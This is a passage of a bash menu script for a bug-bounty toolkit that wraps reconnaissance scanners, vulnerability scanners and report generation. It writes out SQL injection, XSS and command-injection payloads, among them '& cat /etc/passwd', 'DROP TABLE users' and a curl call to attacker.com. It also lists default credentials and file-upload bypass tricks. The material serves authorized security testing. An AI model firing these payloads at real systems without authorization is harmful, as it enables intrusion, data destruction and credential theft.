    success_msg "DNS analysis completed: $dns_output"
}

# Port scanning function
port_scanning() {
    if [ -z "$TARGET" ]; then
        warn_msg "No target set. Please set a target first."
        return
    fi
    
    info_msg "Starting port scanning for $TARGET"
    
    if command -v nmap &> /dev/null; then
        local nmap_output="$OUTPUT_DIR/network/nmap_scan.txt"
        nmap -sS -T4 --top-ports 1000 "$TARGET" > "$nmap_output" 2>&1
        success_msg "Nmap scan completed: $nmap_output"
    elif command -v nc &> /dev/null; then
        local nc_output="$OUTPUT_DIR/network/nc_scan.txt"
        echo "=== Netcat Port Scan for $TARGET ===" > "$nc_output"
        for port in 21 22 23 25 53 80 110 111 135 139 143 443 993 995 1723 3306 3389 5432 5900 8080; do
            if nc -z -w3 "$TARGET" "$port" 2>/dev/null; then
                echo "Port $port: Open" >> "$nc_output"
            fi
        done
        success_msg "Netcat scan completed: $nc_output"
    else
        warn_msg "No port scanning tools available (nmap or nc)"
    fi
}

# URL Discovery function
url_discovery() {
    if [ -z "$TARGET" ]; then
        warn_msg "No target set. Please set a target first."
        return
    fi
    
    info_msg "Starting URL discovery for $TARGET"
    
    # Use multiple URL discovery methods
    local url_output="$OUTPUT_DIR/urls/discovered_urls.txt"
    
    {
        # Wayback URLs
        if command -v waybackurls &> /dev/null; then
            echo "$TARGET" | waybackurls
        fi
        
        # GAU URLs
        if command -v gau &> /dev/null; then
            echo "$TARGET" | gau
        fi
        
        # Manual common paths
        for path in /admin /api /login /config /backup /test /dev /staging; do
            echo "https://$TARGET$path"
            echo "http://$TARGET$path"
        done
        
    } | sort -u > "$url_output"
    
    local count=$(wc -l < "$url_output" 2>/dev/null || echo "0")
    success_msg "Discovered $count URLs: $url_output"
}

# Technology Detection function
technology_detection() {
    if [ -z "$TARGET" ]; then
        warn_msg "No target set. Please set a target first."
        return
    fi
    
    info_msg "Starting technology detection for $TARGET"
    local tech_output="$OUTPUT_DIR/network/technology.txt"
    
    {
        echo "=== Technology Detection for $TARGET ==="
        echo "Date: $(date)"
        echo ""
        
        # HTTP Headers analysis
        echo "=== HTTP Headers ==="
        curl -I "https://$TARGET" 2>/dev/null || curl -I "http://$TARGET" 2>/dev/null
        
        echo ""
        echo "=== Robots.txt ==="
        curl -s "https://$TARGET/robots.txt" 2>/dev/null || curl -s "http://$TARGET/robots.txt" 2>/dev/null
        
        echo ""
        echo "=== Sitemap.xml ==="
        curl -s "https://$TARGET/sitemap.xml" 2>/dev/null || curl -s "http://$TARGET/sitemap.xml" 2>/dev/null
        
    } > "$tech_output"
    
    success_msg "Technology detection completed: $tech_output"
}

# Certificate Analysis function
certificate_analysis() {
    if [ -z "$TARGET" ]; then
        warn_msg "No target set. Please set a target first."
        return
    fi
    
    info_msg "Starting certificate analysis for $TARGET"
    local cert_output="$OUTPUT_DIR/network/certificate.txt"
    
    {
        echo "=== Certificate Analysis for $TARGET ==="
        echo "Date: $(date)"
        echo ""
        
        # SSL Certificate info
        echo "=== SSL Certificate Information ==="
        echo | openssl s_client -connect "$TARGET:443" -servername "$TARGET" 2>/dev/null | openssl x509 -text -noout
        
        echo ""
        echo "=== Certificate Transparency Logs ==="
        curl -s "https://crt.sh/?q=%.$TARGET&output=json" | jq -r '.[].name_value' 2>/dev/null | sort -u
        
    } > "$cert_output"
    
    success_msg "Certificate analysis completed: $cert_output"
}

# WHOIS Analysis function
whois_analysis() {
    if [ -z "$TARGET" ]; then
        warn_msg "No target set. Please set a target first."
        return
    fi
    
    info_msg "Starting WHOIS analysis for $TARGET"
    local whois_output="$OUTPUT_DIR/network/whois.txt"
    
    whois "$TARGET" > "$whois_output" 2>&1
    success_msg "WHOIS analysis completed: $whois_output"
}

# Social OSINT function
social_osint() {
    if [ -z "$TARGET" ]; then
        warn_msg "No target set. Please set a target first."
        return
    fi
    
    info_msg "Starting social OSINT for $TARGET"
    local osint_output="$OUTPUT_DIR/network/social_osint.txt"
    
    {
        echo "=== Social OSINT for $TARGET ==="
        echo "Date: $(date)"
        echo ""
        
        echo "=== Manual OSINT Checks ==="
        echo "LinkedIn: https://www.linkedin.com/search/results/companies/?keywords=$TARGET"
        echo "Twitter: https://twitter.com/search?q=$TARGET"
        echo "Facebook: https://www.facebook.com/search/top?q=$TARGET"
        echo "Instagram: https://www.instagram.com/explore/tags/$TARGET/"
        echo "GitHub: https://github.com/search?q=$TARGET"
        echo "Reddit: https://www.reddit.com/search/?q=$TARGET"
        
    } > "$osint_output"
    
    success_msg "Social OSINT references created: $osint_output"
}

# Full Reconnaissance function
full_reconnaissance() {
    if [ -z "$TARGET" ]; then
        warn_msg "No target set. Please set a target first."
        return
    fi
    
    info_msg "Starting full reconnaissance suite for $TARGET"
    
    # Run all reconnaissance functions
    subdomain_enumeration
    dns_analysis
    port_scanning
    url_discovery
    wayback_analysis
    technology_detection
    certificate_analysis
    whois_analysis
    social_osint
    
    success_msg "Full reconnaissance completed"
    generate_recon_report
}
# Nuclei Vulnerability Scan
nuclei_scan() {
    if [ -z "$TARGET" ]; then
        warn_msg "No target set. Please set a target first."
        return
    fi
    
    info_msg "Starting Nuclei vulnerability scan for $TARGET"
    
    if command -v nuclei &> /dev/null; then
        local nuclei_output="$OUTPUT_DIR/vulns/nuclei_scan.txt"
        
        # Check if live subdomains exist
        if [ -f "$OUTPUT_DIR/subdomains/live_subdomains.txt" ]; then
            nuclei -l "$OUTPUT_DIR/subdomains/live_subdomains.txt" -o "$nuclei_output" -severity low,medium,high,critical
        else
            echo "$TARGET" | nuclei -o "$nuclei_output" -severity low,medium,high,critical
        fi
        
        success_msg "Nuclei scan completed: $nuclei_output"
    else
        warn_msg "Nuclei not installed. Please install nuclei first."
    fi
}

# SQL Injection Testing
sql_injection_test() {
    if [ -z "$TARGET" ]; then
        warn_msg "No target set. Please set a target first."
        return
    fi
    
    info_msg "Starting SQL injection testing for $TARGET"
    
    if [ -f "$SCRIPT_DIR/sqli_test.sh" ]; then
        cd "$OUTPUT_DIR/vulns"
        bash "$SCRIPT_DIR/sqli_test.sh" "$TARGET"
        cd - > /dev/null
        success_msg "SQL injection testing completed"
    else
        warn_msg "SQL injection test script not found"
        # Manual SQLi check
        local sqli_output="$OUTPUT_DIR/vulns/sqli_manual.txt"
        echo "Manual SQL injection test for $TARGET" > "$sqli_output"
        echo "Test URLs with common SQL injection payloads:" >> "$sqli_output"
        echo "https://$TARGET/page?id=1' OR '1'='1" >> "$sqli_output"
        echo "https://$TARGET/page?id=1; DROP TABLE users--" >> "$sqli_output"
        success_msg "Manual SQL injection tests created: $sqli_output"
    fi
}

# XSS Testing
xss_testing() {
    if [ -z "$TARGET" ]; then
        warn_msg "No target set. Please set a target first."
        return
    fi
    
    info_msg "Starting XSS testing for $TARGET"
    
    if command -v dalfox &> /dev/null; then
        local xss_output="$OUTPUT_DIR/vulns/xss_scan.txt"
        echo "$TARGET" | dalfox pipe -o "$xss_output"
        success_msg "XSS scan completed: $xss_output"
    elif [ -f "$SCRIPT_DIR/swagger.sh" ]; then
        # Use swagger XSS testing
        bash "$SCRIPT_DIR/swagger.sh" -t "https://$TARGET"
        success_msg "Swagger XSS testing completed"
    else
        warn_msg "XSS testing tools not available"
        # Manual XSS payloads
        local xss_output="$OUTPUT_DIR/vulns/xss_manual.txt"
        cat > "$xss_output" << 'EOF'
Manual XSS Testing Payloads:
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src=javascript:alert('XSS')></iframe>
<input autofocus onfocus=alert('XSS')>
EOF
        success_msg "Manual XSS payloads created: $xss_output"
    fi
}

# Directory Fuzzing
directory_fuzzing() {
    if [ -z "$TARGET" ]; then
        warn_msg "No target set. Please set a target first."
        return
    fi
    
    info_msg "Starting directory fuzzing for $TARGET"
    
    if command -v ffuf &> /dev/null; then
        local ffuf_output="$OUTPUT_DIR/vulns/directory_fuzz.txt"
        ffuf -u "https://$TARGET/FUZZ" -w /usr/share/wordlists/dirb/common.txt -o "$ffuf_output" -of csv
        success_msg "Directory fuzzing completed: $ffuf_output"
    elif command -v gobuster &> /dev/null; then
        local gobuster_output="$OUTPUT_DIR/vulns/gobuster_scan.txt"
        gobuster dir -u "https://$TARGET" -w /usr/share/wordlists/dirb/common.txt -o "$gobuster_output"
        success_msg "Gobuster scan completed: $gobuster_output"
    else
        warn_msg "Directory fuzzing tools not available (ffuf or gobuster)"
    fi
}

# Parameter Discovery
parameter_discovery() {
    if [ -z "$TARGET" ]; then
        warn_msg "No target set. Please set a target first."
        return
    fi
    
    info_msg "Starting parameter discovery for $TARGET"
    
    if command -v arjun &> /dev/null; then
        local arjun_output="$OUTPUT_DIR/vulns/parameters.txt"
        arjun -u "https://$TARGET" -o "$arjun_output"
        success_msg "Parameter discovery completed: $arjun_output"
    else
        warn_msg "Arjun not installed. Please install arjun for parameter discovery."
    fi
}

# CORS Testing
cors_testing() {
    if [ -z "$TARGET" ]; then
        warn_msg "No target set. Please set a target first."
        return
    fi
    
    info_msg "Starting CORS testing for $TARGET"
    local cors_output="$OUTPUT_DIR/vulns/cors_test.txt"
    
    {
        echo "=== CORS Testing for $TARGET ==="
        echo "Date: $(date)"
        echo ""
        
        # Test CORS headers
        echo "=== CORS Headers Test ==="
        curl -H "Origin: https://evil.com" -I "https://$TARGET" 2>/dev/null | grep -i "access-control"
        
        echo ""
        echo "=== Wildcard CORS Test ==="
        curl -H "Origin: null" -I "https://$TARGET" 2>/dev/null | grep -i "access-control"
        
    } > "$cors_output"
    
    success_msg "CORS testing completed: $cors_output"
}

# Command Injection Testing
command_injection_test() {
    if [ -z "$TARGET" ]; then
        warn_msg "No target set. Please set a target first."
        return
    fi
    
    info_msg "Starting command injection testing for $TARGET"
    local cmd_output="$OUTPUT_DIR/vulns/command_injection.txt"
    
    cat > "$cmd_output" << 'EOF'
Manual Command Injection Testing Payloads:
; ls
| whoami
& cat /etc/passwd
`id`
$(whoami)
; ping -c 4 127.0.0.1
|| curl http://attacker.com
EOF
    
    success_msg "Command injection payloads created: $cmd_output"
}

# File Upload Testing
file_upload_test() {
    if [ -z "$TARGET" ]; then
        warn_msg "No target set. Please set a target first."
        return
    fi
    
    info_msg "Starting file upload testing for $TARGET"
    local upload_output="$OUTPUT_DIR/vulns/file_upload.txt"
    
    cat > "$upload_output" << 'EOF'
File Upload Testing Guidelines:
1. Try uploading files with different extensions: .php, .jsp, .asp, .phtml
2. Test with double extensions: .jpg.php, .png.jsp
3. Try null byte injection: file.php%00.jpg
4. Test with different MIME types
5. Try path traversal: ../../../shell.php
6. Test with polyglot files (valid image + code)
EOF
    
    success_msg "File upload testing guidelines created: $upload_output"
}

# Authentication Testing
auth_testing() {
    if [ -z "$TARGET" ]; then
        warn_msg "No target set. Please set a target first."
        return
    fi
    
    info_msg "Starting authentication testing for $TARGET"
    local auth_output="$OUTPUT_DIR/vulns/auth_testing.txt"
    
    {
        echo "=== Authentication Testing for $TARGET ==="
        echo "Date: $(date)"
        echo ""
        
        echo "=== Common Login Endpoints ==="
        echo "https://$TARGET/login"
        echo "https://$TARGET/admin"
        echo "https://$TARGET/wp-admin"
        echo "https://$TARGET/administrator"
        
        echo ""
        echo "=== Default Credentials to Test ==="
        echo "admin:admin"
        echo "admin:password"
        echo "admin:123456"
        echo "root:root"
        echo "administrator:administrator"
        
    } > "$auth_output"
    
    success_msg "Authentication testing guide created: $auth_output"
}

# Full Vulnerability Suite
full_vulnerability_suite() {
    if [ -z "$TARGET" ]; then
        warn_msg "No target set. Please set a target first."
        return
    fi
    
    info_msg "Starting full vulnerability testing suite for $TARGET"
    
    # Run all vulnerability tests
    nuclei_scan
    sql_injection_test
    xss_testing
    directory_fuzzing
    parameter_discovery
    cors_testing
    command_injection_test
    file_upload_test
    auth_testing
    
    success_msg "Full vulnerability suite completed"
    generate_vuln_report
}
# Standard Scan function
standard_scan() {
    if [ -z "$TARGET" ]; then
        warn_msg "No target set. Please set a target first."
        return
    fi
    
    info_msg "Starting standard scan for $TARGET"
    
    # Basic reconnaissance
    subdomain_enumeration
    dns_analysis
    technology_detection
    
    # Basic vulnerability testing
    nuclei_scan
    directory_fuzzing
    
    success_msg "Standard scan completed"
    generate_standard_report
}

# Comprehensive Scan function
comprehensive_scan() {
    if [ -z "$TARGET" ]; then
        warn_msg "No target set. Please set a target first."
        return
    fi
    
    info_msg "Starting comprehensive scan for $TARGET"
    
    # Full reconnaissance
    full_reconnaissance
    
    # Full vulnerability suite
    full_vulnerability_suite
    
    success_msg "Comprehensive scan completed"
    generate_comprehensive_report
}

# Custom Workflow function
custom_workflow() {
    echo -e "\n${YELLOW}[*] Custom Workflow Builder${NC}"
    echo "Select tools to include in your custom workflow:"
    echo ""
    echo "Reconnaissance:"
    echo "1. Subdomain Enumeration"
    echo "2. DNS Analysis"
    echo "3. Port Scanning"
    echo "4. URL Discovery"
    echo "5. Wayback Analysis"
    echo ""
    echo "Vulnerability Testing:"
    echo "6. Nuclei Scan"
    echo "7. XSS Testing"
    echo "8. SQL Injection Testing"
    echo "9. Directory Fuzzing"
    echo ""
    echo "Enter numbers separated by commas (e.g., 1,2,6,7):"
    read -p "Selection: " selections
    
    if [ -z "$TARGET" ]; then
        warn_msg "No target set. Please set a target first."
        return
    fi
    
    info_msg "Starting custom workflow for $TARGET"
    
    IFS=',' read -ra SELECTED <<< "$selections"
    for selection in "${SELECTED[@]}"; do
        case $selection in
            1) subdomain_enumeration ;;
            2) dns_analysis ;;
            3) port_scanning ;;
            4) url_discovery ;;
            5) wayback_analysis ;;
            6) nuclei_scan ;;
            7) xss_testing ;;
            8) sql_injection_test ;;
            9) directory_fuzzing ;;
            *) warn_msg "Invalid selection: $selection" ;;
        esac
    done
    
    success_msg "Custom workflow completed"
}

# Schedule Scan function
schedule_scan() {
    echo -e "\n${YELLOW}[*] Schedule Recurring Scan${NC}"
    echo "1. Daily scan"
    echo "2. Weekly scan"
    echo "3. Monthly scan"
    echo "4. Custom cron schedule"
    
    read -p "Select schedule type: " schedule_type
    
    case $schedule_type in
        1)
            # Daily scan
            (crontab -l 2>/dev/null; echo "0 2 * * * cd $SCRIPT_DIR && ./bug_bounty_menu.sh automated_daily") | crontab -
            success_msg "Daily scan scheduled for 2:00 AM"
            ;;
        2)
            # Weekly scan
            (crontab -l 2>/dev/null; echo "0 2 * * 0 cd $SCRIPT_DIR && ./bug_bounty_menu.sh automated_weekly") | crontab -
            success_msg "Weekly scan scheduled for Sundays at 2:00 AM"
            ;;
        3)
            # Monthly scan
            (crontab -l 2>/dev/null; echo "0 2 1 * * cd $SCRIPT_DIR && ./bug_bounty_menu.sh automated_monthly") | crontab -
            success_msg "Monthly scan scheduled for 1st of each month at 2:00 AM"
            ;;
        4)
            read -p "Enter custom cron schedule (e.g., '0 2 * * 1'): " custom_schedule
            (crontab -l 2>/dev/null; echo "$custom_schedule cd $SCRIPT_DIR && ./bug_bounty_menu.sh automated_custom") | crontab -
            success_msg "Custom scan scheduled: $custom_schedule"
            ;;
        *)
            warn_msg "Invalid selection"
            ;;
    esac
}

# Resume Session function
resume_session() {
    echo -e "\n${CYAN}[*] Available Sessions:${NC}"
    
    local sessions=()
    while IFS= read -r -d '' session; do
        sessions+=("$(basename "$session")")
    done < <(find "$RESULTS_DIR" -maxdepth 1 -type d -name "*_*" -print0 2>/dev/null)
    
    if [ ${#sessions[@]} -eq 0 ]; then
        warn_msg "No previous sessions found"
        return
    fi
    
    local i=1
    for session in "${sessions[@]}"; do
        echo "$i. $session"
        ((i++))
    done
    
    read -p "Select session to resume (number): " session_num
    
    if [[ "$session_num" =~ ^[0-9]+$ ]] && [ "$session_num" -ge 1 ] && [ "$session_num" -le "${#sessions[@]}" ]; then
        local selected_session="${sessions[$((session_num-1))]}"
        OUTPUT_DIR="$RESULTS_DIR/$selected_session"
        
        # Extract target from session name
        TARGET=$(echo "$selected_session" | sed 's/_[0-9]\{8\}_[0-9]\{6\}$//')
        
        success_msg "Resumed session: $selected_session"
        success_msg "Target: $TARGET"
    else
        warn_msg "Invalid selection"
    fi
}
# Install Tools function
install_tools() {
    info_msg "Installing/Updating Bug Bounty Tools"
    
    if [ -f "$SCRIPT_DIR/install_toolkit.sh" ]; then
        bash "$SCRIPT_DIR/install_toolkit.sh"
        success_msg "Tool installation script executed"
    else
        echo -e "\n${YELLOW}[*] Manual Installation Guide:${NC}"
        echo "Go tools (install to ~/go/bin):"
        echo "go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
        echo "go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest"
        echo "go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest"
        echo "go install -v github.com/tomnomnom/waybackurls@latest"
        echo "go install -v github.com/tomnomnom/assetfinder@latest"
        echo "go install -v github.com/ffuf/ffuf@latest"
        echo ""
        echo "Python tools:"
        echo "pip3 install sqlmap"
        echo "pip3 install arjun"
        echo ""
        echo "Apt packages:"
        echo "sudo apt update && sudo apt install -y nmap gobuster dirb nikto"
    fi
}

# Configure Wordlists function
configure_wordlists() {
    info_msg "Configuring Wordlists"
    
    local wordlist_dir="/usr/share/wordlists"
    
    if [ ! -d "$wordlist_dir" ]; then
        sudo mkdir -p "$wordlist_dir"
    fi
    
    echo -e "\n${YELLOW}[*] Available Wordlist Sources:${NC}"
    echo "1. SecLists (comprehensive)"
    echo "2. FuzzDB"
    echo "3. PayloadsAllTheThings"
    echo "4. Custom wordlist location"
    
    read -p "Select option: " wordlist_choice
    
    case $wordlist_choice in
        1)
            if [ ! -d "$wordlist_dir/SecLists" ]; then
                info_msg "Downloading SecLists..."
                sudo git clone https://github.com/danielmiessler/SecLists.git "$wordlist_dir/SecLists"
                success_msg "SecLists installed"
            else
                info_msg "Updating SecLists..."
                sudo git -C "$wordlist_dir/SecLists" pull
                success_msg "SecLists updated"
            fi
            ;;
        2)
            if [ ! -d "$wordlist_dir/FuzzDB" ]; then
                info_msg "Downloading FuzzDB..."
                sudo git clone https://github.com/fuzzdb-project/fuzzdb.git "$wordlist_dir/FuzzDB"
                success_msg "FuzzDB installed"
            else
                success_msg "FuzzDB already exists"
            fi
            ;;
        3)
            if [ ! -d "$wordlist_dir/PayloadsAllTheThings" ]; then
                info_msg "Downloading PayloadsAllTheThings..."
                sudo git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git "$wordlist_dir/PayloadsAllTheThings"
                success_msg "PayloadsAllTheThings installed"
            else
                success_msg "PayloadsAllTheThings already exists"
            fi
            ;;
        4)
            read -p "Enter custom wordlist directory path: " custom_path
            if [ -d "$custom_path" ]; then
                echo "CUSTOM_WORDLIST_DIR=\"$custom_path\"" >> "$CONFIG_FILE"
                success_msg "Custom wordlist directory configured"
            else
                warn_msg "Directory does not exist: $custom_path"
            fi
            ;;
        *)
            warn_msg "Invalid selection"
            ;;
    esac
}

# Update Nuclei Templates
update_nuclei_templates() {
    info_msg "Updating Nuclei Templates"
    
    if command -v nuclei &> /dev/null; then
        nuclei -update-templates
        success_msg "Nuclei templates updated"
    else
        warn_msg "Nuclei not installed. Please install nuclei first."
    fi
}

# Custom Tool Launcher
custom_tool_launcher() {
    echo -e "\n${YELLOW}[*] Custom Tool Launcher${NC}"
    echo "Available custom scripts:"
    
    local i=1
    local scripts=()
    
    # Find all executable scripts
    while IFS= read -r -d '' script; do
        scripts+=("$(basename "$script")")
        echo "$i. $(basename "$script")"
        ((i++))
    done < <(find "$SCRIPT_DIR" -name "*.sh" -executable -print0 2>/dev/null)
    
    if [ ${#scripts[@]} -eq 0 ]; then
        warn_msg "No executable scripts found"
        return
    fi
    
    read -p "Select script to run (number): " script_num
    
    if [[ "$script_num" =~ ^[0-9]+$ ]] && [ "$script_num" -ge 1 ] && [ "$script_num" -le "${#scripts[@]}" ]; then
        local selected_script="${scripts[$((script_num-1))]}"
        read -p "Enter arguments for $selected_script: " script_args
        
        info_msg "Running $selected_script $script_args"
        bash "$SCRIPT_DIR/$selected_script" $script_args
        success_msg "Script execution completed"
    else
        warn_msg "Invalid selection"
    fi
}

# Tool Configuration
tool_configuration() {
    echo -e "\n${YELLOW}[*] Tool Configuration${NC}"
    echo "1. Configure Subfinder"
    echo "2. Configure Nuclei"
    echo "3. Configure Proxy Settings"
    echo "4. Configure User Agents"
    
    read -p "Select configuration: " config_choice
    
    case $config_choice in
        1)
            info_msg "Configuring Subfinder API keys"
            echo "Add your API keys to ~/.config/subfinder/config.yaml"
            echo "Example APIs: Shodan, Censys, VirusTotal, SecurityTrails"
            ;;
        2)
            info_msg "Configuring Nuclei"
            echo "Nuclei config location: ~/.config/nuclei/"
            echo "Templates location: ~/nuclei-templates/"
            ;;
        3)
            read -p "Enter proxy (e.g., http://127.0.0.1:8080): " proxy_setting
            echo "HTTP_PROXY=\"$proxy_setting\"" >> "$CONFIG_FILE"
            echo "HTTPS_PROXY=\"$proxy_setting\"" >> "$CONFIG_FILE"
            success_msg "Proxy configured: $proxy_setting"
            ;;
        4)
            read -p "Enter custom User-Agent: " user_agent
            echo "USER_AGENT=\"$user_agent\"" >> "$CONFIG_FILE"
            success_msg "User-Agent configured"
            ;;
        *)
            warn_msg "Invalid selection"
            ;;
    esac
}

# Performance Tuning
performance_tuning() {
    echo -e "\n${YELLOW}[*] Performance Tuning${NC}"
    echo "1. Set thread count"
    echo "2. Set timeout values"
    echo "3. Set rate limiting"
    echo "4. Memory optimization"
    
    read -p "Select tuning option: " tune_choice
    
    case $tune_choice in
        1)
            read -p "Enter thread count (default: 50): " threads
            echo "DEFAULT_THREADS=${threads:-50}" >> "$CONFIG_FILE"
            success_msg "Thread count set to ${threads:-50}"
            ;;
        2)
            read -p "Enter timeout in seconds (default: 30): " timeout
            echo "DEFAULT_TIMEOUT=${timeout:-30}" >> "$CONFIG_FILE"
            success_msg "Timeout set to ${timeout:-30} seconds"
            ;;
        3)
            read -p "Enter rate limit (requests per second): " rate_limit
            echo "RATE_LIMIT=${rate_limit}" >> "$CONFIG_FILE"
            success_msg "Rate limit set to $rate_limit req/sec"
            ;;
        4)
            echo "Memory optimization tips:"
            echo "- Use smaller wordlists for initial scans"
            echo "- Process results in batches"
            echo "- Clean up temporary files regularly"
            ;;
        *)
            warn_msg "Invalid selection"
            ;;
    esac
}

# Backup and Restore
backup_restore() {
    echo -e "\n${YELLOW}[*] Backup & Restore${NC}"
    echo "1. Backup current session"
    echo "2. Backup all results"
    echo "3. Restore from backup"
    echo "4. Export configuration"
    echo "5. Import configuration"
    
    read -p "Select option: " backup_choice
    
    case $backup_choice in
        1)
            if [ -n "$OUTPUT_DIR" ] && [ -d "$OUTPUT_DIR" ]; then
                local backup_file="$(basename "$OUTPUT_DIR")_backup_$(date +%Y%m%d_%H%M%S).tar.gz"
                tar -czf "$backup_file" -C "$(dirname "$OUTPUT_DIR")" "$(basename "$OUTPUT_DIR")"
                success_msg "Session backed up to: $backup_file"
            else
                warn_msg "No active session to backup"
            fi
            ;;
        2)
            local backup_file="all_results_backup_$(date +%Y%m%d_%H%M%S).tar.gz"
            tar -czf "$backup_file" "$RESULTS_DIR"
            success_msg "All results backed up to: $backup_file"
            ;;
        3)
            echo "Available backups:"
            ls -la *.tar.gz 2>/dev/null || echo "No backup files found"
            read -p "Enter backup filename to restore: " restore_file
            if [ -f "$restore_file" ]; then
                tar -xzf "$restore_file"
                success_msg "Backup restored from: $restore_file"
            else
                warn_msg "Backup file not found: $restore_file"
            fi
            ;;
        4)
            local config_backup="config_backup_$(date +%Y%m%d_%H%M%S).conf"
            cp "$CONFIG_FILE" "$config_backup"
            success_msg "Configuration exported to: $config_backup"
            ;;
        5)
            read -p "Enter configuration file to import: " import_config
            if [ -f "$import_config" ]; then
                cp "$import_config" "$CONFIG_FILE"
                success_msg "Configuration imported from: $import_config"
                load_config
            else
                warn_msg "Configuration file not found: $import_config"
            fi
            ;;
        *)
            warn_msg "Invalid selection"
            ;;
    esac
}
# View Results function
view_results() {
    if [ -z "$OUTPUT_DIR" ] || [ ! -d "$OUTPUT_DIR" ]; then
        warn_msg "No active session or results directory"
        return
    fi
    
    echo -e "\n${CYAN}[*] Current Session Results:${NC}"
    echo "Session: $(basename "$OUTPUT_DIR")"
    echo "Target: $TARGET"
    echo ""
    
    # Display results summary
    echo "=== RESULTS SUMMARY ==="
    
    local subdomain_count=0
    local live_subdomain_count=0
    local vuln_count=0
    
    if [ -f "$OUTPUT_DIR/subdomains/all_subdomains.txt" ]; then
        subdomain_count=$(wc -l < "$OUTPUT_DIR/subdomains/all_subdomains.txt" 2>/dev/null || echo "0")
    fi
    
    if [ -f "$OUTPUT_DIR/subdomains/live_subdomains.txt" ]; then
        live_subdomain_count=$(wc -l < "$OUTPUT_DIR/subdomains/live_subdomains.txt" 2>/dev/null || echo "0")
    fi
    
    if [ -f "$OUTPUT_DIR/vulns/nuclei_scan.txt" ]; then
        vuln_count=$(wc -l < "$OUTPUT_DIR/vulns/nuclei_scan.txt" 2>/dev/null || echo "0")
    fi
    
    echo "Subdomains Found: $subdomain_count"
    echo "Live Subdomains: $live_subdomain_count"
    echo "Vulnerabilities: $vuln_count"
    echo ""
    
    # Show directory structure
    echo "=== DIRECTORY STRUCTURE ==="
    find "$OUTPUT_DIR" -type f -name "*.txt" -o -name "*.json" -o -name "*.html" | head -20
    
    echo ""
    read -p "View detailed file? Enter filename (or press Enter to continue): " view_file
    
    if [ -n "$view_file" ] && [ -f "$OUTPUT_DIR/$view_file" ]; then
        echo -e "\n${YELLOW}=== Content of $view_file ===${NC}"
        head -50 "$OUTPUT_DIR/$view_file"
        echo ""
        echo "(Showing first 50 lines)"
    fi
}

# Generate HTML Report
generate_html_report() {
    if [ -z "$OUTPUT_DIR" ] || [ ! -d "$OUTPUT_DIR" ]; then
        warn_msg "No active session to generate report for"
        return
    fi
    
    info_msg "Generating HTML report for session: $(basename "$OUTPUT_DIR")"
    
    local report_file="$OUTPUT_DIR/reports/full_report.html"
    
    # Calculate statistics
    local subdomain_count=0
    local live_count=0
    local vuln_count=0
    
    [ -f "$OUTPUT_DIR/subdomains/all_subdomains.txt" ] && subdomain_count=$(wc -l < "$OUTPUT_DIR/subdomains/all_subdomains.txt" 2>/dev/null || echo "0")
    [ -f "$OUTPUT_DIR/subdomains/live_subdomains.txt" ] && live_count=$(wc -l < "$OUTPUT_DIR/subdomains/live_subdomains.txt" 2>/dev/null || echo "0")
    [ -f "$OUTPUT_DIR/vulns/nuclei_scan.txt" ] && vuln_count=$(wc -l < "$OUTPUT_DIR/vulns/nuclei_scan.txt" 2>/dev/null || echo "0")
    
    cat > "$report_file" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>Bug Bounty Report - $TARGET</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .header { background: #2c3e50; color: white; padding: 30px; border-radius: 10px; text-align: center; }
        .stats { display: flex; justify-content: space-around; margin: 20px 0; }
        .stat-box { background: white; padding: 20px; border-radius: 10px; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .stat-number { font-size: 2em; font-weight: bold; color: #3498db; }
        .section { background: white; margin: 20px 0; padding: 20px; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .vuln { background: #fee; border-left: 5px solid #e74c3c; padding: 10px; margin: 10px 0; }
        .subdomain { background: #efe; border-left: 5px solid #27ae60; padding: 5px; margin: 5px 0; }
        pre { background: #ecf0f1; padding: 15px; border-radius: 5px; overflow-x: auto; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🎯 Bug Bounty Security Assessment</h1>
        <h2>Target: $TARGET</h2>
        <p>Generated: $(date)</p>
        <p>Session: $(basename "$OUTPUT_DIR")</p>
    </div>
    
    <div class="stats">
        <div class="stat-box">
            <div class="stat-number">$subdomain_count</div>
            <div>Subdomains</div>
        </div>
        <div class="stat-box">
            <div class="stat-number">$live_count</div>
            <div>Live Hosts</div>
        </div>
        <div class="stat-box">
            <div class="stat-number">$vuln_count</div>
            <div>Vulnerabilities</div>
        </div>
    </div>
EOF
    
    # Add subdomains section
    if [ -f "$OUTPUT_DIR/subdomains/all_subdomains.txt" ] && [ -s "$OUTPUT_DIR/subdomains/all_subdomains.txt" ]; then
        cat >> "$report_file" << 'EOF'
    <div class="section">
        <h2>🌐 Discovered Subdomains</h2>
EOF
        while IFS= read -r subdomain; do
            echo "        <div class=\"subdomain\">$subdomain</div>" >> "$report_file"
        done < "$OUTPUT_DIR/subdomains/all_subdomains.txt"
        echo '    </div>' >> "$report_file"
    fi
    
    # Add vulnerabilities section
    if [ -f "$OUTPUT_DIR/vulns/nuclei_scan.txt" ] && [ -s "$OUTPUT_DIR/vulns/nuclei_scan.txt" ]; then
        cat >> "$report_file" << 'EOF'
    <div class="section">
        <h2>🚨 Vulnerabilities Found</h2>
EOF
        while IFS= read -r vuln; do
            echo "        <div class=\"vuln\">$vuln</div>" >> "$report_file"
        done < "$OUTPUT_DIR/vulns/nuclei_scan.txt"
        echo '    </div>' >> "$report_file"
    fi
    
    cat >> "$report_file" << 'EOF'
    <div class="section">
        <h2>📊 Scan Details</h2>
        <p>This assessment was conducted using the Bug Bounty Toolkit v3.0</p>
        <p>Tools used: Subfinder, HTTPx, Nuclei, Custom scripts</p>
        <p>Methodology: OWASP Testing Guide, Bug Bounty best practices</p>
    </div>
</body>
</html>
EOF
    
    success_msg "HTML report generated: $report_file"
}

# Generate JSON Report
generate_json_report() {
    if [ -z "$OUTPUT_DIR" ] || [ ! -d "$OUTPUT_DIR" ]; then
        warn_msg "No active session to generate report for"
        return
    fi
    
    info_msg "Generating JSON report for session: $(basename "$OUTPUT_DIR")"
    
    local json_report="$OUTPUT_DIR/reports/report.json"
    
    cat > "$json_report" << EOF
{
  "target": "$TARGET",
